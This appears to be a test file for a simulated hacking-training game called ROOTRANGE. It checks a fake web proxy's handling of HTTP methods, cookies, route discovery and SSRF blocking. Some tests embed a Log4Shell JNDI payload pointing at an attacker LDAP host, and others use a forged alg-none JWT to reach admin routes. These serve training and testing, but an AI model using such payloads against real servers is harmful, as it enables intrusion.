import { describe, it, expect, beforeEach } from 'vitest';
import { SimulationEngine } from '../simulation/simulationEngine';
import { useGameStore } from '../store/gameStore';

describe('ROOTRANGE Phase 7: Built-in Web Security Proxy & HTTP Repeater', () => {
  let engine: SimulationEngine;

  beforeEach(() => {
    engine = SimulationEngine.getInstance();
    useGameStore.getState().resetGame();
  });

  describe('1. HTTP Methods Support', () => {
    it('supports standard GET requests returning HTML content', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'GET',
        path: '/',
        headers: { Host: '10.10.11.45' },
      });

      expect(res.statusCode).toBe(200);
      expect(res.contentType).toContain('text/html');
      expect(res.body).toContain('E-Corp Internal HR Subsystem');
    });

    it('supports POST requests with JSON payload on API endpoints', () => {
      engine.setActiveMachineId('iron-vault');
      const res = engine.handleHttpRequest('10.10.11.82', {
        method: 'POST',
        path: '/api/login',
        headers: { Host: '10.10.11.82', 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'finance_admin', password: 'banker123' }),
      });

      expect(res.statusCode).toBe(200);
      expect(res.contentType).toBe('application/json');
      expect(res.body).toContain('token');
    });

    it('supports PUT and PATCH requests for resource updates', () => {
      engine.setActiveMachineId('iron-vault');
      const token = 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.';

      const putRes = engine.handleHttpRequest('10.10.11.82', {
        method: 'PUT',
        path: '/api/users',
        headers: { Host: '10.10.11.82', Authorization: token },
        body: JSON.stringify({ id: 2, role: 'auditor' }),
      });
      expect(putRes.statusCode).toBe(200);
      expect(putRes.body).toContain('patched successfully');

      const patchRes = engine.handleHttpRequest('10.10.11.82', {
        method: 'PATCH',
        path: '/api/users',
        headers: { Host: '10.10.11.82', Authorization: token },
        body: JSON.stringify({ role: 'senior_auditor' }),
      });
      expect(patchRes.statusCode).toBe(200);
      expect(patchRes.body).toContain('PATCH');
    });

    it('supports DELETE requests on authorized endpoints', () => {
      engine.setActiveMachineId('iron-vault');
      const token = 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.';

      const delRes = engine.handleHttpRequest('10.10.11.82', {
        method: 'DELETE',
        path: '/api/users',
        headers: { Host: '10.10.11.82', Authorization: token },
      });
      expect(delRes.statusCode).toBe(200);
      expect(delRes.body).toContain('purged from MySQL');
    });

    it('supports HEAD and OPTIONS requests without crashing', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'HEAD',
        path: '/',
        headers: { Host: '10.10.11.45' },
      });
      expect(res.statusCode).toBe(200);
    });
  });

  describe('2. Query Parameter Handling', () => {
    it('parses embedded query parameters from URL path and filters results', () => {
      engine.setActiveMachineId('iron-vault');
      const token = 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.';

      const res = engine.handleHttpRequest('10.10.11.82', {
        method: 'GET',
        path: '/api/users?role=finance_admin',
        headers: { Host: '10.10.11.82', Authorization: token },
      });

      expect(res.statusCode).toBe(200);
      const data = JSON.parse(res.body);
      expect(data.count).toBe(2);
      expect(data.users.every((u: { role: string }) => u.role === 'finance_admin')).toBe(true);
    });

    it('accepts explicit queryParams object and filters accurately', () => {
      engine.setActiveMachineId('iron-vault');
      const token = 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.';

      const res = engine.handleHttpRequest('10.10.11.82', {
        method: 'GET',
        path: '/api/users',
        queryParams: { role: 'service' },
        headers: { Host: '10.10.11.82', Authorization: token },
      });

      expect(res.statusCode).toBe(200);
      const data = JSON.parse(res.body);
      expect(data.count).toBe(1);
      expect(data.users[0].username).toBe('node_app');
    });
  });

  describe('3. Headers & Exploit Injection Vectors', () => {
    it('triggers Log4Shell JNDI exploit when injected into User-Agent header', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'POST',
        path: '/api/audit',
        headers: {
          Host: '10.10.11.45',
          'User-Agent': '${jndi:ldap://10.10.14.22:1389/Exploit}',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ test: 'recon' }),
      });

      expect(res.statusCode).toBe(200);
      expect(res.body).toContain('exploit_triggered');
      expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('USER');
    });

    it('triggers Log4Shell JNDI exploit when injected into X-Forwarded-For header', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'POST',
        path: '/api/audit',
        headers: {
          Host: '10.10.11.45',
          'X-Forwarded-For': '${jndi:ldap://10.10.14.22:1389/Exploit}',
          'Content-Type': 'application/json',
        },
        body: '{}',
      });

      expect(res.statusCode).toBe(200);
      expect(res.body).toContain('ldap://10.10.14.22:1389/Exploit');
    });

    it('validates Bearer token in Authorization header for protected vault route', () => {
      engine.setActiveMachineId('iron-vault');
      // 1. Unauthenticated request
      const unauth = engine.handleHttpRequest('10.10.11.82', {
        method: 'GET',
        path: '/api/vault',
        headers: { Host: '10.10.11.82' },
      });
      expect(unauth.statusCode).toBe(401);

      // 2. Authenticated with JWT alg: none token
      const auth = engine.handleHttpRequest('10.10.11.82', {
        method: 'GET',
        path: '/api/vault',
        headers: {
          Host: '10.10.11.82',
          Authorization: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.',
        },
      });
      expect(auth.statusCode).toBe(200);
      expect(auth.body).toContain('backup.sh');
    });
  });

  describe('4. Cookie Handling & Session Authorization', () => {
    it('blocks access to /admin when session cookie is missing', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'GET',
        path: '/admin',
        headers: { Host: '10.10.11.45' },
      });

      expect(res.statusCode).toBe(403);
      expect(res.body).toContain('403 Forbidden');
    });

    it('grants administrative access to /admin when valid session_id cookie is present', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'GET',
        path: '/admin',
        headers: {
          Host: '10.10.11.45',
          Cookie: 'session_id=admin_session_root_99; Path=/',
        },
      });

      expect(res.statusCode).toBe(200);
      expect(res.contentType).toBe('application/json');
      expect(res.body).toContain('Alexander Morgan');
      expect(res.body).toContain('/usr/bin/find');

      // Verifies evidence was recorded
      const evidence = engine.getEvidence();
      expect(evidence.some((e) => e.name === 'Admin Session Access')).toBe(true);
    });

    it('issues Set-Cookie header on successful employee login', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'POST',
        path: '/login',
        headers: {
          Host: '10.10.11.45',
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'username=alex&password=alexpassword',
      });

      expect(res.statusCode).toBe(200);
      expect(res.headers['Set-Cookie']).toContain('session_id=ecorp_alex_sess_8921');
    });

    it('authorizes /api/vault access via auth_token cookie', () => {
      engine.setActiveMachineId('iron-vault');
      const res = engine.handleHttpRequest('10.10.11.82', {
        method: 'GET',
        path: '/api/vault',
        headers: {
          Host: '10.10.11.82',
          Cookie: 'auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.',
        },
      });

      expect(res.statusCode).toBe(200);
      expect(res.body).toContain('VAULT-SEC-9941');
    });
  });

  describe('5. Route Discovery & Port Automatic Enumeration', () => {
    it('records discovered routes upon HTTP requests', () => {
      engine.handleHttpRequest('10.10.11.45', {
        method: 'GET',
        path: '/portal',
        headers: { Host: '10.10.11.45' },
      });

      const discoveredRoutes = engine.getDiscoveredRoutes('ecorp-hr');
      expect(discoveredRoutes).toContain('/portal');
    });

    it('auto-discovers port 80/8080/3000 upon successful HTTP request', () => {
      engine.handleHttpRequest('10.10.11.45', {
        method: 'GET',
        path: '/',
        headers: { Host: '10.10.11.45' },
      });

      const ports = engine.getDiscoveredPorts('ecorp-hr');
      expect(ports).toContain(80);
    });
  });

  describe('6. Security Boundaries & SSRF Isolation', () => {
    it('blocks arbitrary external internet addresses with a 403 Security Boundary Violation', () => {
      const res = engine.handleHttpRequest('google.com', {
        method: 'GET',
        path: '/search?q=test',
        headers: { Host: 'google.com' },
      });

      expect(res.statusCode).toBe(403);
      expect(res.body).toContain('Security Boundary Violation');
      expect(res.body).toContain('isolated virtual range subnets');
      expect(res.headers['X-Security-Policy']).toContain('ROOTRANGE-Virtual-Isolation-Active');
    });

    it('blocks loopback / localhost SSRF destinations', () => {
      const res1 = engine.handleHttpRequest('127.0.0.1', {
        method: 'GET',
        path: '/admin',
        headers: { Host: '127.0.0.1' },
      });
      expect(res1.statusCode).toBe(403);
      expect(res1.body).toContain('Security Boundary Violation');

      const res2 = engine.handleHttpRequest('localhost', {
        method: 'GET',
        path: '/admin',
        headers: { Host: 'localhost' },
      });
      expect(res2.statusCode).toBe(403);
    });

    it('blocks cloud metadata 169.254.x.x addresses', () => {
      const res = engine.handleHttpRequest('169.254.169.254', {
        method: 'GET',
        path: '/latest/meta-data/',
        headers: { Host: '169.254.169.254' },
      });

      expect(res.statusCode).toBe(403);
    });

    it('enforces network pivot boundaries: unreachable isolated targets return 504 Gateway Timeout', () => {
      // IronBank is on internal-services subnet requiring ecorp-hr pivot
      // Ensure ecorp-hr has NO compromise and activeMachineId is not iron-vault
      engine.setActiveMachineId(undefined);
      engine.setMachineCompromiseLevel('ecorp-hr', 'NONE');

      const res = engine.handleHttpRequest('10.10.11.82', {
        method: 'GET',
        path: '/',
        headers: { Host: '10.10.11.82' },
      });

      expect(res.statusCode).toBe(504);
      expect(res.body).toContain('504 Gateway Timeout');
      expect(res.body).toContain('isolated');
    });
  });

  describe('7. Active Directory & Infrastructure Endpoints', () => {
    it('serves Active Directory Certificate Services (ADCS) enrollment interface on Corp-DC01', () => {
      // Pivot active via targeting or foothold
      engine.setActiveMachineId('corp-dc01');

      const res = engine.handleHttpRequest('10.10.11.99', {
        method: 'GET',
        path: '/certsrv',
        headers: { Host: '10.10.11.99' },
      });

      expect(res.statusCode).toBe(200);
      expect(res.body).toContain('Active Directory Certificate Services');
      expect(res.body).toContain('corp-dc01-CA');
    });

    it('serves Domain Controller Health JSON API on Corp-DC01', () => {
      engine.setActiveMachineId('corp-dc01');

      const res = engine.handleHttpRequest('10.10.11.99', {
        method: 'GET',
        path: '/health',
        headers: { Host: '10.10.11.99' },
      });

      expect(res.statusCode).toBe(200);
      const data = JSON.parse(res.body);
      expect(data.domain).toBe('corp.local');
      expect(data.kerberos_kdc).toBe('ONLINE');
    });
  });
});
